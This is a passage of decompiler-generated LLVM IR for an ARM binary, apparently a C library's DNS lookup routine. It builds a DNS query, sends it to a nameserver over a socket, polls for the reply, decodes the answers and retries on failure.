  br i1 %v3_153b4, label %bb195, label %dec_label_pc_153c8

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_15aa8

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_15aa8

dec_label_pc_153c8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_153cc = icmp eq i32 %arg3, 0
  br i1 %v2_153cc, label %dec_label_pc_15aa8, label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153c8
  %v2_153d8 = load i8, i8* %arg1, align 1
  %v2_153dc = icmp eq i8 %v2_153d8, 0
  br i1 %v2_153dc, label %dec_label_pc_15aa8, label %dec_label_pc_153e4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153d4
  %v3_153e8 = call i32 @strlen(i8* nonnull %arg1)
  %v2_153f0 = add i32 %v3_153e8, %tmp
  %v1_153f4 = add i32 %v2_153f0, -1
  %v2_153f4 = inttoptr i32 %v1_153f4 to i8*
  %v3_153f4 = load i8, i8* %v2_153f4, align 1
  %v2_153f8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_153f8, i32* @r4, align 4
  %v7_153fc = icmp eq i8 %v3_153f4, 46
  %. = zext i1 %v7_153fc to i32
  store i32 %v2_153f8, i32* @r0, align 4
  %v1_15420 = call i32 @__pthread_return_void()
  %v1_15430 = call i32 @__pthread_return_0()
  %v2_1543c = load i32, i32* @global_var_29da0.871, align 4
  %v2_15440 = srem i32 %v2_1543c, %arg3
  %v3_15448 = load i8, i8* @global_var_23aed.874, align 1
  %v4_15448 = zext i8 %v3_15448 to i32
  %v2_1544c = load i8, i8* bitcast (i8** @global_var_23aec.873 to i8*), align 4
  %v3_1544c = zext i8 %v2_1544c to i32
  %v4_15454 = mul nuw nsw i32 %v4_15448, 256
  %v5_15454 = or i32 %v3_1544c, %v4_15454
  store i32 %v5_15454, i32* @sb, align 4
  store i32 %v2_15440, i32* @sl, align 4
  store i32 %v2_153f8, i32* @r0, align 4
  %v1_15468 = call i32 @__pthread_return_void()
  %v0_15474 = load i32, i32* @r5, align 4
  %v2_15494 = ptrtoint i8* %stack_var_-188 to i32
  %v6_154d8 = bitcast i8* %stack_var_-188 to i32*
  %v2_155b8 = ptrtoint i32* %stack_var_-92 to i32
  %v3_15650 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_156b4 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_15a00 = icmp eq i1 %v7_153fc, false
  %v7_15708 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_157ec = ptrtoint i32* %stack_var_-140 to i32
  %v9_158e4 = icmp eq i32 %tmp147, %arg2
  %v7_15878 = icmp eq i32 %arg2, 1
  %v2_15820 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_15474, 3
  br i1 %tmp292, label %dec_label_pc_1547c.lr.ph.preheader.lr.ph, label %dec_label_pc_15ab4

dec_label_pc_1547c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_153e4
  %v2_1578c = icmp eq i32 %tmp156, 0
  %v8_1587c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_1547c.lr.ph.preheader

dec_label_pc_1547c:                               ; preds = %dec_label_pc_1547c.lr.ph, %dec_label_pc_15a98.backedge
  %v1_15484 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_1547c.lr.ph ], [ %v0_1562c, %dec_label_pc_15a98.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_1547c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_15a98.backedge ]
  %v7_15480 = icmp eq i32 %v1_15484, -1
  br i1 %v7_15480, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_1547c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_1547c, %bb199
  %v1_15488 = xor i1 %v7_15480, true
  call void @__pseudo_cond_branch(i1 %v1_15488, i32 ptrtoint (i32* @global_var_f738.876 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_15494, i32* @r4, align 4
  %v0_15498 = load i32, i32* @r7, align 4
  %v2_1549c = inttoptr i32 %v0_15498 to i8*
  %v3_1549c = call i32 @__GI_memset(i8* %v2_1549c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_154ac = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_154b0 = load i32, i32* @sb, align 4
  %v1_154b0 = add i32 %v0_154b0, 1
  %v3_154b8 = urem i32 %v1_154b0, 65536
  store i32 %v3_154b8, i32* @sb, align 4
  %v0_154c4 = load i32, i32* @r7, align 4
  %v5_154d0 = trunc i32 %v1_154b0 to i8
  store i8 %v5_154d0, i8* %stack_var_-188, align 1
  %v7_154d8 = call i32 @__encode_header(i32* %v6_154d8, i32 %v0_154c4, i32 512, i32 1, i32 %v1_154b0)
  store i32 %v7_154d8, i32* @r5, align 4
  %v1_154dc = icmp slt i32 %v7_154d8, 0
  br i1 %v1_154dc, label %dec_label_pc_15ab4, label %dec_label_pc_154e4

dec_label_pc_154e4:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_154ec = load i32, i32* %stack_var_-236, align 4
  %v4_154f0 = call i32 @strncpy(i32 %v2_154ec, i32 %tmp, i32 1025)
  store i32 %v2_153f8, i32* @r0, align 4
  %v1_15508 = call i32 @__pthread_return_void()
  %v1_15518 = call i32 @__pthread_return_0()
  %v1_15528 = load i32, i32* @sl, align 4
  %v4_15528 = mul i32 %v1_15528, 4
  %v5_15528 = add i32 %v4_15528, %arg4
  %v6_15528 = inttoptr i32 %v5_15528 to i32*
  %v7_15528 = load i32, i32* %v6_15528, align 4
  store i32 %v7_15528, i32* @r6, align 4
  br i1 %v1_15524, label %dec_label_pc_1556c, label %dec_label_pc_15530

dec_label_pc_15530:                               ; preds = %dec_label_pc_154e4
  %v2_15538 = load i32, i32* @global_var_29e70.879, align 4
  %v6_15540 = icmp slt i32 %v6_15a5c, %v2_15538
  br i1 %v6_15540, label %dec_label_pc_15544, label %dec_label_pc_1556c

dec_label_pc_15544:                               ; preds = %dec_label_pc_15530
  store i32 ptrtoint (i32* @global_var_1b048.881 to i32), i32* @r1, align 4
  %v2_1554c = load i32, i32* %stack_var_-236, align 4
  %v4_15550 = inttoptr i32 %v2_1554c to i8*
  %v5_15550 = call i32 @__GI_strncat(i8* %v4_15550, i32 ptrtoint (i32* @global_var_1b048.881 to i32), i32 1025, i32 %v2_15538)
  %v7_15560 = load i32, i32* %v6_15560, align 4
  store i32 %v7_15560, i32* @r1, align 4
  %v4_15568 = inttoptr i32 %v2_1554c to i8*
  %v5_15568 = call i32 @__GI_strncat(i8* %v4_15568, i32 %v7_15560, i32 1025, i32 ptrtoint (i32* @global_var_29e50.883 to i32))
  br label %dec_label_pc_1556c

dec_label_pc_1556c:                               ; preds = %dec_label_pc_15530, %dec_label_pc_154e4, %dec_label_pc_15544
  store i32 %v2_153f8, i32* @r0, align 4
  store i32 87424, i32* @lr, align 4
  %v1_1557c = call i32 @__pthread_return_void()
  %v2_15588 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15588, i32* %stack_var_-56, align 4
  %v0_15598 = load i32, i32* @r7, align 4
  %v1_15598 = load i32, i32* @r5, align 4
  %v2_15598 = add i32 %v1_15598, %v0_15598
  %v1_1559c = sub i32 512, %v1_15598
  %v8_155a4 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_15598, i32 %v1_1559c, i32 %arg2, i32 %v2_15588, i32 %arg2, i32 1)
  store i32 %v8_155a4, i32* @fp, align 4
  %v1_155a8 = icmp slt i32 %v8_155a4, 0
  br i1 %v1_155a8, label %dec_label_pc_15ab4, label %dec_label_pc_155b0

dec_label_pc_155b0:                               ; preds = %dec_label_pc_1556c
  store i32 0, i32* @r4, align 4
  %v0_155c0 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_155cc = inttoptr i32 %v0_155c0 to i8*
  %v4_155cc = call i32 @inet_pton(i32 10, i8* %v3_155cc, i32 %v2_155b8)
  %v1_155d0 = load i32, i32* @r4, align 4
  %v7_155d4 = icmp sgt i32 %v4_155cc, %v1_155d0
  br i1 %v7_155d4, label %bb201, label %dec_label_pc_155b0..thread11_crit_edge

dec_label_pc_155b0..thread11_crit_edge:           ; preds = %dec_label_pc_155b0
  %v3_155e0.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_155b0
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_155b0..thread11_crit_edge, %bb201
  %v3_155e0 = phi i8 [ %v3_155e0.pre, %dec_label_pc_155b0..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_155e0 = sext i8 %v3_155e0 to i32
  %v8_155dc.op = urem i32 %v1_155d0, 256
  %v8_155dc.op.op = mul nuw nsw i32 %v8_155dc.op, 256
  %v4_155e8 = select i1 %v7_155d4, i32 %v8_155dc.op.op, i32 0
  %v5_155e8 = or i32 %v4_155e0, %v4_155e8
  %v7_155ec = icmp eq i32 %v5_155e8, 10
  br i1 %v7_155ec, label %dec_label_pc_15618, label %dec_label_pc_15600

dec_label_pc_15600:                               ; preds = %.thread11
  %v0_15604 = load i32, i32* @r6, align 4
  store i32 %v0_15604, i32* @r0, align 4
  %v1_15610 = call i32 @inet_addr(i32 %v0_15604)
  br label %dec_label_pc_15618

dec_label_pc_15618:                               ; preds = %.thread11, %dec_label_pc_15600
  %v0_1562c = call i32 @socket()
  %v1_15630 = icmp slt i32 %v0_1562c, 0
  br i1 %v1_15630, label %.thread, label %dec_label_pc_15648

.thread:                                          ; preds = %dec_label_pc_15618
  br label %dec_label_pc_15a98.backedge

dec_label_pc_15a98.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_1547c, label %dec_label_pc_15ab4

dec_label_pc_15648:                               ; preds = %dec_label_pc_15618
  %v4_15650 = call i32 @__libc_connect(i32 %v0_1562c, %sockaddr* nonnull %v3_15650, i32 28)
  %v1_15654 = icmp slt i32 %v4_15650, 0
  br i1 %v1_15654, label %dec_label_pc_1565c, label %dec_label_pc_1567c

dec_label_pc_1565c:                               ; preds = %dec_label_pc_15648
  %v0_1565c = call i32 @__errno_location()
  %v1_15660 = inttoptr i32 %v0_1565c to i32*
  %v2_15660 = load i32, i32* %v1_15660, align 4
  %v7_15664 = icmp eq i32 %v2_15660, 101
  br i1 %v7_15664, label %dec_label_pc_159c8, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1565c
  br label %dec_label_pc_15a98.backedge

dec_label_pc_1567c:                               ; preds = %dec_label_pc_15648
  %v0_1567c = load i32, i32* @r5, align 4
  %v1_1567c = load i32, i32* @fp, align 4
  %v2_1567c = add i32 %v1_1567c, %v0_1567c
  %v0_15680 = load i32, i32* @r7, align 4
  %v4_1568c = inttoptr i32 %v0_15680 to i32*
  %v5_1568c = call i32 @__libc_send(i32 %v0_1562c, i32* %v4_1568c, i32 %v2_1567c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_1562c, i32* %stack_var_-44, align 4
  %v11_156b4 = call i32 @__libc_poll(%pollfd* %v10_156b4, i32 1, i32 10000, i32 1, i32 %v0_1562c, i32 1, i32 0)
  %v1_156b8 = load i32, i32* @r4, align 4
  %v7_156bc = icmp sgt i32 %v11_156b4, %v1_156b8
  br i1 %v7_156bc, label %dec_label_pc_156c0, label %dec_label_pc_159c8

dec_label_pc_156c0:                               ; preds = %dec_label_pc_1567c
  %v0_156c8 = load i32, i32* @r7, align 4
  %v5_156d0 = inttoptr i32 %v0_156c8 to i32*
  %v6_156d0 = call i32 @__libc_recv(i32 %v0_1562c, i32* %v5_156d0, i32 512, i32 %v1_156b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_156d0, i32* @fp, align 4
  %v7_156dc = icmp slt i32 %v6_156d0, 12
  br i1 %v7_156dc, label %dec_label_pc_159fc, label %dec_label_pc_156e0

dec_label_pc_156e0:                               ; preds = %dec_label_pc_156c0
  %v0_156e0 = load i32, i32* @r7, align 4
  %v2_156e8 = inttoptr i32 %v0_156e0 to i8*
  %v3_156e8 = call i32 @__decode_header(i8* %v2_156e8, i32 %v2_15494)
  %v3_156ec = load i8, i8* %stack_var_-188, align 1
  %v4_156ec = sext i8 %v3_156ec to i32
  store i32 %v4_156ec, i32* @r6, align 4
  %v1_156f0 = load i32, i32* @sb, align 4
  %v9_156f0 = icmp eq i32 %v4_156ec, %v1_156f0
  br i1 %v9_156f0, label %dec_label_pc_156f8, label %dec_label_pc_159fc

dec_label_pc_156f8:                               ; preds = %dec_label_pc_156e0
  %v1_156fc = load i32, i32* @r4, align 4
  %v9_156fc = icmp eq i32 %tmp157, %v1_156fc
  br i1 %v9_156fc, label %dec_label_pc_159fc, label %dec_label_pc_15704

dec_label_pc_15704:                               ; preds = %dec_label_pc_156f8
  br i1 %v7_15708, label %dec_label_pc_15710, label %dec_label_pc_1578c

dec_label_pc_15710:                               ; preds = %dec_label_pc_15704
  %v9_15714 = icmp eq i32 %., %v1_156fc
  br i1 %v9_15714, label %dec_label_pc_1571c, label %dec_label_pc_15780

dec_label_pc_1571c:                               ; preds = %dec_label_pc_15710
  store i32 %v2_153f8, i32* @r5, align 4
  store i32 %v2_153f8, i32* @r0, align 4
  %v1_15734 = call i32 @__pthread_return_void()
  %v1_15744 = call i32 @__pthread_return_0()
  store i32 %v2_153f8, i32* @r0, align 4
  %v2_15750 = load i32, i32* @global_var_29e70.879, align 4
  %v1_15760 = call i32 @__pthread_return_void()
  %v1_15768 = add i32 %v2_15750, -1
  store i32 %v1_15768, i32* @r4, align 4
  %v5_15770 = icmp slt i32 %v6_15a5c, %v1_15768
  br i1 %v5_15770, label %.thread19, label %dec_label_pc_15780

.thread19:                                        ; preds = %dec_label_pc_1571c
  %v7_15770 = add i32 %v6_15a5c, 1
  %v6_15774 = load i32, i32* @r6, align 4
  store i32 %v6_15774, i32* @sb, align 4
  br label %dec_label_pc_15a98.outer.backedge

dec_label_pc_15780:                               ; preds = %dec_label_pc_1571c, %dec_label_pc_15710
  %v0_15780 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_157b0

dec_label_pc_1578c:                               ; preds = %dec_label_pc_15704
  br i1 %v2_1578c, label %dec_label_pc_15794, label %dec_label_pc_159fc

dec_label_pc_15794:                               ; preds = %dec_label_pc_1578c
  br i1 %tmp198, label %dec_label_pc_157a8, label %dec_label_pc_157c0.preheader

dec_label_pc_157c0.preheader:                     ; preds = %dec_label_pc_15794
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_157c0

dec_label_pc_157a8:                               ; preds = %dec_label_pc_15794
  %v0_157a8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_157b0

dec_label_pc_157b0:                               ; preds = %dec_label_pc_15780, %dec_label_pc_157a8
  %storemerge4 = phi i32 [ %v0_157a8, %dec_label_pc_157a8 ], [ %v0_15780, %dec_label_pc_15780 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_157a8 ], [ 1, %dec_label_pc_15780 ]
  %v2_157b0 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_157b0, align 4
  br label %dec_label_pc_15ac4

dec_label_pc_157b8:                               ; preds = %dec_label_pc_157c0
  %v2_157b8 = call i32 @__length_question(i32 %v0_157cc, i32 %v0_157c8)
  %v0_157bc = load i32, i32* @r5, align 4
  %v2_157bc = add i32 %v0_157bc, %v2_157b8
  store i32 %v2_157bc, i32* @r5, align 4
  %v0_157c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_157c0

dec_label_pc_157c0:                               ; preds = %dec_label_pc_157c0.preheader, %dec_label_pc_157b8
  %v0_157c8 = phi i32 [ 12, %dec_label_pc_157c0.preheader ], [ %v2_157bc, %dec_label_pc_157b8 ]
  %v0_157d0 = phi i32 [ 0, %dec_label_pc_157c0.preheader ], [ %v0_157c4.pre, %dec_label_pc_157b8 ]
  store i32 %v0_157c8, i32* @r1, align 4
  %v0_157cc = load i32, i32* @r7, align 4
  store i32 %v0_157cc, i32* @r0, align 4
  %v1_157d0 = add i32 %v0_157d0, 1
  store i32 %v1_157d0, i32* @r4, align 4
  %v5_157d4 = icmp slt i32 %v0_157d0, 1
  br i1 %v5_157d4, label %dec_label_pc_157b8, label %dec_label_pc_157d8

dec_label_pc_157d8:                               ; preds = %dec_label_pc_157c0
  br label %dec_label_pc_15934

dec_label_pc_157ec:                               ; preds = %bb205
  store i32 %v2_157ec, i32* @r4, align 4
  %v0_157f0 = load i32, i32* @r7, align 4
  %v0_157f8 = load i32, i32* @fp, align 4
  %v5_15800 = call i32 @__decode_answer(i32 %v0_157f0, i32 %v0_157f4, i32 %v0_157f8, i32* nonnull %stack_var_-140)
  %v1_15804 = icmp slt i32 %v5_15800, 0
  br i1 %v1_15804, label %dec_label_pc_15810, label %dec_label_pc_1582c

dec_label_pc_15810:                               ; preds = %dec_label_pc_157ec
  %v2_15814 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_15814, label %dec_label_pc_159fc, label %dec_label_pc_1581c

dec_label_pc_1581c:                               ; preds = %dec_label_pc_15810
  br i1 %v2_15820, label %dec_label_pc_159fc, label %dec_label_pc_15948

dec_label_pc_1582c:                               ; preds = %dec_label_pc_157ec
  %v2_15830 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_15830, label %dec_label_pc_158d4, label %dec_label_pc_15838

dec_label_pc_15838:                               ; preds = %dec_label_pc_1582c
  %v0_15838 = load i32, i32* @r8, align 4
  %v3_1583c = add i32 %v0_15838, 32
  %v4_1583c = inttoptr i32 %v3_1583c to i32*
  %v5_1583c = load i32, i32* %v4_1583c, align 4
  store i32 %v5_1583c, i32* @ip, align 4
  %v6_1583c = add i32 %v0_15838, 36
  %v7_1583c = inttoptr i32 %v6_1583c to i32*
  %v8_1583c = load i32, i32* %v7_1583c, align 4
  store i32 %v8_1583c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_157ec, i32* @r1, align 4
  store i32 %v0_15838, i32* @r0, align 4
  %v0_15858 = call i32 @memcpy()
  %v0_1585c = load i32, i32* @r8, align 4
  %v1_1585c = add i32 %v0_1585c, 4
  %v2_1585c = inttoptr i32 %v1_1585c to i32*
  %v3_1585c = load i32, i32* %v2_1585c, align 4
  %v7_15860 = icmp eq i32 %v3_1585c, 24
  br i1 %v7_15860, label %dec_label_pc_15884, label %dec_label_pc_15868

dec_label_pc_15868:                               ; preds = %dec_label_pc_15838
  %v1_15868 = add i32 %v0_1585c, 28
  %v2_15868 = inttoptr i32 %v1_15868 to i32*
  %v3_15868 = load i32, i32* %v2_15868, align 4
  %v2_1586c = icmp eq i32 %v3_15868, 0
  br i1 %v2_1586c, label %dec_label_pc_15948, label %dec_label_pc_15874

dec_label_pc_15874:                               ; preds = %dec_label_pc_15868
  br i1 %v7_15878, label %dec_label_pc_15884, label %bb203

bb203:                                            ; preds = %dec_label_pc_15874
  br i1 %v8_1587c, label %dec_label_pc_15884, label %dec_label_pc_15948

dec_label_pc_15884:                               ; preds = %dec_label_pc_15874, %bb203, %dec_label_pc_15838
  %v9_15888 = icmp eq i32 %v3_1585c, %arg2
  br i1 %v9_15888, label %dec_label_pc_1589c, label %dec_label_pc_15890

dec_label_pc_15890:                               ; preds = %dec_label_pc_15884
  %v1_15890 = inttoptr i32 %v0_1585c to i32*
  %v2_15890 = load i32, i32* %v1_15890, align 4
  store i32 %v2_15890, i32* @r0, align 4
  %v0_15894 = call i32 @free()
  br label %dec_label_pc_15920

dec_label_pc_1589c:                               ; preds = %dec_label_pc_15884
  %v1_158a4 = add i32 %v0_1585c, 16
  %v2_158a4 = inttoptr i32 %v1_158a4 to i32*
  %v3_158a4 = load i32, i32* %v2_158a4, align 4
  %v2_158a8 = sub i32 %tmp155, %stack_var_-192.0
  %v1_158ac = add i32 %v2_158a8, -1
  %v1_158b0 = add i32 %v3_158a4, 4
  %v2_158b4 = mul i32 %v1_158b0, %v1_158ac
  %v1_158b8 = add i32 %v0_1585c, 32
  %v2_158b8 = inttoptr i32 %v1_158b8 to i32*
  %v3_158b8 = load i32, i32* %v2_158b8, align 4
  %v2_158c0 = add i32 %v0_1585c, 36
  %v3_158c0 = inttoptr i32 %v2_158c0 to i32*
  store i32 %v1_158ac, i32* %v3_158c0, align 4
  %tmp294 = icmp ugt i32 %v2_158b4, %v3_158b8
  br i1 %tmp294, label %dec_label_pc_15948, label %dec_label_pc_1589c.dec_label_pc_1591c_crit_edge

dec_label_pc_1589c.dec_label_pc_1591c_crit_edge:  ; preds = %dec_label_pc_1589c
  %v1_1591c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1591c

dec_label_pc_158d4:                               ; preds = %dec_label_pc_1582c
  %v3_158d4 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_158d4, i32* @r0, align 4
  %v0_158d8 = call i32 @free()
  br i1 %v9_158e4, label %dec_label_pc_158ec, label %dec_label_pc_15920

dec_label_pc_158ec:                               ; preds = %dec_label_pc_158d4
  %v0_158ec = load i32, i32* @r8, align 4
  %v1_158ec = add i32 %v0_158ec, 16
  %v2_158ec = inttoptr i32 %v1_158ec to i32*
  %v3_158ec = load i32, i32* %v2_158ec, align 4
  %v9_158f4 = icmp eq i32 %v3_158ec, %tmp146
  br i1 %v9_158f4, label %dec_label_pc_158fc, label %dec_label_pc_159f4

dec_label_pc_158fc:                               ; preds = %dec_label_pc_158ec
  %v1_158fc = add i32 %v0_158ec, 36
  %v2_158fc = inttoptr i32 %v1_158fc to i32*
  %v3_158fc = load i32, i32* %v2_158fc, align 4
  %v1_15900 = add i32 %v0_158ec, 28
  %v2_15900 = inttoptr i32 %v1_15900 to i32*
  %v3_15900 = load i32, i32* %v2_15900, align 4
  %v3_15904 = mul i32 %v3_158fc, %tmp146
  %v4_15904 = add i32 %v3_15900, %v3_15904
  store i32 %v4_15904, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_15910 = call i32 @memcpy()
  %v0_15914 = load i32, i32* @r8, align 4
  %v1_15914 = add i32 %v0_15914, 36
  %v2_15914 = inttoptr i32 %v1_15914 to i32*
  %v3_15914 = load i32, i32* %v2_15914, align 4
  %v1_15918 = add i32 %v3_15914, 1
  br label %dec_label_pc_1591c

dec_label_pc_1591c:                               ; preds = %dec_label_pc_1589c.dec_label_pc_1591c_crit_edge, %dec_label_pc_158fc
  %v1_1591c = phi i32 [ %v0_15914, %dec_label_pc_158fc ], [ %v1_1591c.pre, %dec_label_pc_1589c.dec_label_pc_1591c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_15918, %dec_label_pc_158fc ], [ 0, %dec_label_pc_1589c.dec_label_pc_1591c_crit_edge ]
  %v2_1591c = add i32 %v1_1591c, 36
  %v3_1591c = inttoptr i32 %v2_1591c to i32*
  store i32 %storemerge5, i32* %v3_1591c, align 4
  br label %dec_label_pc_15920

dec_label_pc_15920:                               ; preds = %dec_label_pc_158d4, %dec_label_pc_15890, %dec_label_pc_1591c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_1591c ], [ 0, %dec_label_pc_158d4 ], [ %stack_var_-212.2, %dec_label_pc_15890 ]
  %v1_15928 = add i32 %stack_var_-192.0, 1
  %v0_15930 = load i32, i32* @r5, align 4
  %v2_15930 = add i32 %v0_15930, %v5_15800
  store i32 %v2_15930, i32* @r5, align 4
  br label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_157d8, %dec_label_pc_15920
  %v0_157f4 = phi i32 [ %v0_157c8, %dec_label_pc_157d8 ], [ %v2_15930, %dec_label_pc_15920 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_157d8 ], [ %stack_var_-212.1, %dec_label_pc_15920 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_157d8 ], [ %v1_15928, %dec_label_pc_15920 ]
  %v2_1593c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1593c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1593c = xor i32 %v2_1593c, %stack_var_-192.0
  %v6_1593c = and i32 %v5_1593c, %v4_1593c
  %v5_15940 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_15940, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_15934
  %v7_15940 = load i32, i32* @fp, align 4
  %v8_15940 = sub i32 %v0_157f4, %v7_15940
  %v10_15940 = xor i32 %v7_15940, %v0_157f4
  %v11_15940 = xor i32 %v8_15940, %v0_157f4
  %v12_15940 = and i32 %v11_15940, %v10_15940
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_15934, %bb204
  %v1_15944.in = phi i32 [ %v6_1593c, %dec_label_pc_15934 ], [ %v12_15940, %bb204 ]
  %v0_15944.in = phi i32 [ %v2_1593c, %dec_label_pc_15934 ], [ %v8_15940, %bb204 ]
  %v0_15944 = icmp slt i32 %v0_15944.in, 0
  %v1_15944 = icmp slt i32 %v1_15944.in, 0
  %v2_15944 = xor i1 %v1_15944, %v0_15944
  br i1 %v2_15944, label %dec_label_pc_157ec, label %dec_label_pc_15948

dec_label_pc_15948:                               ; preds = %dec_label_pc_1581c, %bb203, %dec_label_pc_1589c, %dec_label_pc_15868, %bb205
  %v1_1594c = call i32 @__libc_close(i32 %v0_1562c)
  %v3_15950 = load i32, i32* %stack_var_0, align 4
  %v2_15954 = icmp eq i32 %v3_15950, 0
  br i1 %v2_15954, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_15948
  %v1_1595c = load i32, i32* @r7, align 4
  %v3_15958 = inttoptr i32 %v3_15950 to i32*
  store i32 %v1_1595c, i32* %v3_15958, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_15948
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 88420, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15954, i32 ptrtoint (i32* @global_var_12808.599 to i32))
  %v2_15964 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15964, i32* @r0, align 4
  store i32 %v2_153f8, i32* @r4, align 4
  %v0_1596c = call i32 @free()
  store i32 %v2_153f8, i32* @r0, align 4
  %v1_15984 = call i32 @__pthread_return_void()
  %v1_15994 = call i32 @__pthread_return_0()
  %v0_159a0 = load i32, i32* @r6, align 4
  %v3_159a0 = sdiv i32 %v0_159a0, 256
  store i32 %v3_159a0, i32* @ip, align 4
  %v0_159a4 = load i32, i32* @sl, align 4
  store i32 %v0_159a4, i32* @global_var_29da0.871, align 4
  store i32 %v2_153f8, i32* @r0, align 4
  %v1_159b0 = trunc i32 %v3_159a0 to i8
  store i8 %v1_159b0, i8* @global_var_23aed.874, align 1
  %v1_159b4 = trunc i32 %v0_159a0 to i8
  store i8 %v1_159b4, i8* bitcast (i8** @global_var_23aec.873 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_159c4.885 to i32), i32* @lr, align 4
  %v1_159c0 = call i32 @__pthread_return_void()
  %v0_15b4c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_15b4c

dec_label_pc_159c8:                               ; preds = %dec_label_pc_1565c, %dec_label_pc_1567c
  %v0_159c8 = load i32, i32* @sl, align 4
  %v1_159c8 = add i32 %v0_159c8, 1
  %v2_159d0 = srem i32 %v1_159c8, %arg3
  store i32 %v2_159d0, i32* @sl, align 4
  %v2_159d4 = icmp eq i32 %v2_159d0, 0
  br i1 %v2_159d4, label %dec_label_pc_159dc, label %dec_label_pc_15a94.backedge

dec_label_pc_159dc:                               ; preds = %dec_label_pc_159c8
  %v1_159e4 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_15a98.outer.backedge

dec_label_pc_15a98.outer.backedge:                ; preds = %dec_label_pc_159dc, %dec_label_pc_15a78, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_15770, %.thread19 ], [ -1, %dec_label_pc_15a78 ], [ -1, %dec_label_pc_159dc ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_15a80, %dec_label_pc_15a78 ], [ %v1_159e4, %dec_label_pc_159dc ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_1547c.lr.ph, label %dec_label_pc_15ab4

dec_label_pc_159f4:                               ; preds = %dec_label_pc_158ec
  %v1_159f4 = inttoptr i32 %v0_158ec to i32*
  %v2_159f4 = load i32, i32* %v1_159f4, align 4
  store i32 %v2_159f4, i32* @r0, align 4
  %v0_159f8 = call i32 @free()
  br label %dec_label_pc_159fc

dec_label_pc_159fc:                               ; preds = %dec_label_pc_1578c, %dec_label_pc_156e0, %dec_label_pc_1581c, %dec_label_pc_15810, %dec_label_pc_156f8, %dec_label_pc_156c0, %dec_label_pc_159f4
  br i1 %v2_15a00, label %dec_label_pc_15a08, label %dec_label_pc_15a64

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159fc
  store i32 %v2_153f8, i32* @r5, align 4
  store i32 %v2_153f8, i32* @r0, align 4
  %v1_15a20 = call i32 @__pthread_return_void()
  %v1_15a30 = call i32 @__pthread_return_0()
  %v2_15a3c = load i32, i32* @global_var_29e70.879, align 4
  store i32 %v2_153f8, i32* @r0, align 4
  %v1_15a4c = call i32 @__pthread_return_void()
  %v1_15a54 = add i32 %v2_15a3c, -1
